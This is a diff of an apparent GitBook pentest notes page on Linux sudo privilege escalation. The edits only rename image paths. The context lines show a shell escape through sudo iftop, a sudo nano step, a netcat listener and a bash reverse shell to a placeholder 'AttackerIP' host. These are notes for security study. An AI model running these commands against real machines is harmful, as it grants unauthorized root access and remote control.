@@ -2,7 +2,7 @@
 
 start to know which process run with sudo privilege `sudo -l`
 
-![image.png](<../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![image.png](<../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 we will exploit all service
 
@@ -10,20 +10,20 @@ we will exploit all service
 
 ### Iftop
 
-<figure><img src="../../../.gitbook/assets/image 1 (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 1 (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 sudo /usr/sbin/iftop
 !/bin/sh
 ```
 
-<figure><img src="../../../.gitbook/assets/image 2 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 2 (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ### awk
 
-<figure><img src="../../../.gitbook/assets/image 3 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 3 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -31,7 +31,7 @@ sudo /usr/sbin/iftop
 
 ### nano
 
-<figure><img src="../../../.gitbook/assets/image 4 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 4 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 sudo nano
@@ -52,4 +52,4 @@ nc -nlvp 5253
 bash -i >& /dev/tcp/AttackerIP/5253 0>&1
 ```
 
-<figure><img src="../../../.gitbook/assets/image 5 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 5 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
